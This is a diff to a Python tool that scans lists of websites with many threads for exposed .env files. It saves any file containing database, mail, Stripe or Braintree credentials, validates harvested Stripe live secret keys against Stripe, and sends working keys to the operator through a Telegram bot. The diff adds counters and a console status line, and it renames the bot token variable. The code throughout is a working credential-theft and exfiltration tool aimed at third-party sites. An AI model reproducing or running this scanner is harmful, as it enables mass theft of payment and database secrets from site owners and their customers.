@@ -20,31 +20,41 @@ class xcol:
     RESET = '\u001B[0m'
     LBLUE = '\033[38;2;66;165;245m'
     GREY = '\033[38;2;158;158;158m'
+    YELLOW = '\033[38;2;255;255;0m'
+    WHITE = '\033[38;2;255;255;255m'
 
 class ENV:
     def __init__(self):
         self.mch = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', 'sk_live', 'APP_ENV=', 'BRAINTREE_PUBLIC_KEY']
+        self.counts = {
+            "checked": 0,
+            "total_env": 0,
+            "live_sk": 0,
+            "integration_off_sk": 0,
+            "dead_sk": 0,
+            "braintree": 0
+        }
 
     def scan(self, url):
-        rr = self.check_url(url, 'http')
-        if 'RE' in rr:
-            rr = self.check_url(url, 'https')
-        print(rr + '/.env')
+        self.check_url(url, 'http')
+        self.check_url(url, 'https')
+        self.update_console()
 
     def check_url(self, url, proto):
-        rr = 'RE'
         try:
             r = requests.get(f'{proto}://{url}/.env', verify=False, timeout=10, allow_redirects=False)
+            self.counts["checked"] += 1
             if r.status_code == 200:
                 resp = r.text
                 if any(key in resp for key in self.mch):
-                    rr = f'{xcol.LGREEN}[ENV]{xcol.RESET} : {proto}://{url}'
                     self.save_output(url, proto, resp)
+                    self.counts["total_env"] += 1
                 else:
-                    rr = f'{xcol.LRED}[-] :{xcol.RESET} {proto}://{url}'
+                    self.counts["dead_sk"] += 1
+            else:
+                self.counts["dead_sk"] += 1
         except requests.RequestException:
-            rr = f'{xcol.LRED}[*] :{xcol.RESET} {proto}://{url}'
-        return rr
+            self.counts["dead_sk"] += 1
 
     def save_output(self, url, proto, resp):
         os.makedirs('ENVS', exist_ok=True)
@@ -59,6 +69,7 @@ class ENV:
         if "BRAINTREE_PUBLIC_KEY" in resp:
             with open('Braintree.txt', 'a') as file_object:
                 file_object.write(f'Braintree : {url}\n')
+            self.counts["braintree"] += 1
 
     def log_live_key(self, line):
         sk_live_key = re.sub(".*sk_live", "sk_live", line)
@@ -83,18 +94,24 @@ class ENV:
             response_json = response.json()
             if "id" in response_json:
                 message = f"Live sk : {sk_live_key}"
-                requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={USER_ID}&text={message}&parse_mode=HTML")
-                print(f"{xcol.LGREEN}[Stripe]{xcol.RESET} Request successful with id")
+                requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={message}&parse_mode=HTML")
+                self.counts["live_sk"] += 1
             else:
-                print(f"{xcol.LGREEN}[Stripe]{xcol.RESET} Request successful without id")
+                self.counts["live_sk"] += 1
         elif response.status_code == 401 and "api_key_expired" in response.text:
-            print(f"{xcol.LRED}[Stripe]{xcol.RESET} API key expired")
+            self.counts["dead_sk"] += 1
         elif "Sending credit card numbers directly to the Stripe API is generally unsafe" in response.text:
             message = f"sk integration off : {sk_live_key}"
-            requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={USER_ID}&text={message}&parse_mode=HTML")
-            print(f"{xcol.LRED}[Stripe]{xcol.RESET} Integration off: {sk_live_key}")
+            requests.get(f"https://api.telegram.org/bot{Bot_TOKEN}/sendMessage?chat_id={USER_ID}&text={message}&parse_mode=HTML")
+            self.counts["integration_off_sk"] += 1
         else:
-            print(f"{xcol.LRED}[Stripe]{xcol.RESET} Request failed: {response.status_code} - {response.text}")
+            self.counts["dead_sk"] += 1
+
+    def update_console(self):
+        total_sk = self.counts['live_sk'] + self.counts['integration_off_sk'] + self.counts['dead_sk']
+        sys.stdout.write(
+            f"\rTotal Checked= {self.counts['checked']}, Total env: {self.counts['total_env']}, Total sk: {total_sk}, Live sk: {self.counts['live_sk']}, Integration off sk: {self.counts['integration_off_sk']}, Dead sk: {self.counts['dead_sk']}, Braintree: {self.counts['braintree']}")
+        sys.stdout.flush()
 
 def main():
     os.system('clear')
@@ -124,10 +141,14 @@ def main():
         except FileNotFoundError:
             print("File not found. Please enter a valid file path.")
 
+    env_scanner = ENV()
+
     with ThreadPoolExecutor(max_workers=thrd) as executor:
-        env_scanner = ENV()
         for data in argFile:
             executor.submit(env_scanner.scan, data)
+    
+    env_scanner.update_console()
+    print()
 
 if __name__ == '__main__':
     main()
